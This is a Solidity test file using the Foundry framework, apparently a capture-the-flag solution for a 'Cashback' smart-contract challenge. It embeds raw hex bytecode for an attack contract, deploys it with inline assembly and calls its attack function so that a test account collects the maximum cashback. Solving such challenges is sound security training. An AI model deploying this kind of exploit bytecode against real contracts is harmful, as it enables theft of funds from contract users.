// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Currency, CurrencyLibrary, Cashback} from "./Cashback.sol";
import {
    ICashbackAttack,
    BASIS_POINTS,
    NATIVE_CASHBACK_RATE,
    NATIVE_MAX_CASHBACK,
    FREEDOM_CASHBACK_RATE,
    FREEDOM_MAX_CASHBACK,
    FREEDOM_ADDR,
    SUPER_NFT_ADDR
} from "./CashbackAttack.sol";
import {Test, console} from "forge-std/Test.sol";

// Cashback contract addr: 0xdCc409Af2566c47F6DA4d30Eae8155b332A64078
bytes constant ATTACK_CREATION_BYTECODE =
    hex"6102228061000d5f39805ff3fe603756dcc409af2566c47f6da4d30eae8155b332a6407800000000000000000000000000000000000000000000000000000000000000005b610041341561020c565b61004961015b565b6361bd21b2811461007957638380edb781146101225763f360c183811461012f576334b151188114610144575f5ffd5b6100825f6101a3565b61008c60016101a3565b61009660026101a3565b6100a06002610182565b6100aa6003610182565b6100b46004610182565b604051600461021e823984600482015282602482015260445f5f82845f8c5af16100dd8161020c565b6040519250600461021a84398860048401528760248401528360628401528560828401525f60a284015260c291505f5f83855f8d5af1905061011e8161020c565b5f5ff35b61012a6101dd565b610155565b61014061013b5f610182565b6101ff565b5f5ff35b61015461014f6101f0565b6101d5565b5b50610218565b5f7c01000000000000000000000000000000000000000000000000000000005f3504905090565b5f6020820260040160208101361015610199575f5ffd5b8035915050919050565b5f6101ad82610182565b905073ffffffffffffffffffffffffffffffffffffffff198116156101d0575f5ffd5b919050565b805f5260205ff35b6101e760016101d5565b565b5f5f905090565b5f6101f96101e9565b54905090565b806102086101e9565b5550565b80610215575f5ffd5b50565bfef242432aebc39613";

// forge-lint: disable-next-item(asm-keccak256)
contract SolveCashback is Test {
    Cashback cashback;
    ICashbackAttack cc;
    address attackAddr;

    address payable alice;
    uint256 aliceSK;

    function setUp() public {
        address deployer = makeAddr("deployer");
        vm.startPrank(deployer);

        // currencies
        address[] memory _currencies = new address[](2);
        _currencies[0] = Currency.unwrap(CurrencyLibrary.NATIVE_CURRENCY);
        _currencies[1] = FREEDOM_ADDR;

        // cashback
        uint256[] memory _cashbacks = new uint256[](2);
        _cashbacks[0] = NATIVE_CASHBACK_RATE;
        _cashbacks[1] = FREEDOM_CASHBACK_RATE;

        // maxCashback
        uint256[] memory _maxCashbacks = new uint256[](2);
        _maxCashbacks[0] = NATIVE_MAX_CASHBACK;
        _maxCashbacks[1] = FREEDOM_MAX_CASHBACK;

        // superCashbackNFT addr
        address _superCashbackNFT = SUPER_NFT_ADDR;

        cashback = new Cashback(_currencies, _cashbacks, _maxCashbacks, _superCashbackNFT);

        // deploy the creation bytecode of attack contract
        address addr;
        bytes memory creation = _updateCashbackAddrInCode(ATTACK_CREATION_BYTECODE, address(cashback));
        assembly {
            addr := create(0, add(creation, 0x20), mload(creation))
        }
        require(addr != address(0), "CREATE failed");
        emit log_bytes(addr.code);
        cc = ICashbackAttack(addr);

        _setUpAccounts();

        vm.stopPrank();
    }

    function _updateCashbackAddrInCode(bytes memory code, address cashbackAddr) internal pure returns (bytes memory creation) {
        uint256 byteAddrStart = 16;
        creation = code;

        bytes20 addrBytes = bytes20(cashbackAddr);
        for (uint256 i = 0; i < 20; ++i) {
            creation[byteAddrStart + i] = addrBytes[i];
        }
    }

    function _setUpAccounts() internal {
        aliceSK = 0xA11CE;
        alice = payable(vm.addr(aliceSK));
        vm.deal(alice, 1 ether);
        vm.label(alice, "alice");
    }

    function testSolveCashback() public {
        vm.startPrank(alice, alice);

        address currency = Currency.unwrap(CurrencyLibrary.NATIVE_CURRENCY);
        uint256 expenseAmt = NATIVE_MAX_CASHBACK * BASIS_POINTS / NATIVE_CASHBACK_RATE;
        cc.attack(address(cashback), alice, currency, expenseAmt, NATIVE_MAX_CASHBACK);

        // Confirm the state
        uint256 nativeCashback = cashback.balanceOf(alice, CurrencyLibrary.NATIVE_CURRENCY.toId());
        console.log("nativeCashback: %s", nativeCashback);
        assertEq(nativeCashback, NATIVE_MAX_CASHBACK);

        vm.stopPrank();
    }
}
